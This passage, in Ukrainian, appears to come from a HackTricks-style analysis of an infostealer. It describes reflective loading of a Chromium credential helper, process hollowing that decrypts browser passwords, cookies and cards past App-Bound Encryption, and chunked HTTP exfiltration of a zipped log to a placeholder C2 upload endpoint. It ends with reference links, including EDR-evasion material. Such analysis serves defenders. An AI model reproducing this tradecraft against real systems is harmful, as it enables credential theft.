- Основний DLL/EXE вбудовує Chromium credential helper, який або скидається на диск, або вручну мапиться в пам'яті; у fileless-режимі він сам вирішує imports/relocations, тож жодних артефактів helper не записується.
- Цей helper зберігає DLL другого етапу, зашифровану двічі ChaCha20 (дві 32-байтні ключі + 12-байтні nonces). Після обох проходів він рефлекторно завантажує blob (без `LoadLibrary`) і викликає експорти `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, запозичені з [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Рутини ChromElevator використовують direct-syscall reflective process hollowing для ін'єкції в живий Chromium браузер, успадковують AppBound Encryption keys і дешифрують паролі/cookies/credit cards прямо з SQLite databases незважаючи на ABE hardening.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` перебирає глобальну таблицю вказівників на функції `memory_generators` і створює по одному потоку на увімкнений модуль (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Кожен потік записує результати в спільні буфери і повідомляє кількість файлів після приблизно 45s join window.
- Після завершення все архівується за допомогою статично лінкованої бібліотеки `miniz` як `%TEMP%\\Log.zip`. `ThreadPayload1` потім спить 15s і стрімить архів шматками по 10 MB через HTTP POST на `http://<C2>:6767/upload`, підробляючи браузерний `multipart/form-data` boundary (`----WebKitFormBoundary***`). Кожен chunk додає `User-Agent: upload`, `auth: <build_id>`, опційний `w: <campaign_tag>`, а останній chunk додає `complete: true`, щоб C2 знав, що збирання завершено.

## Посилання

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
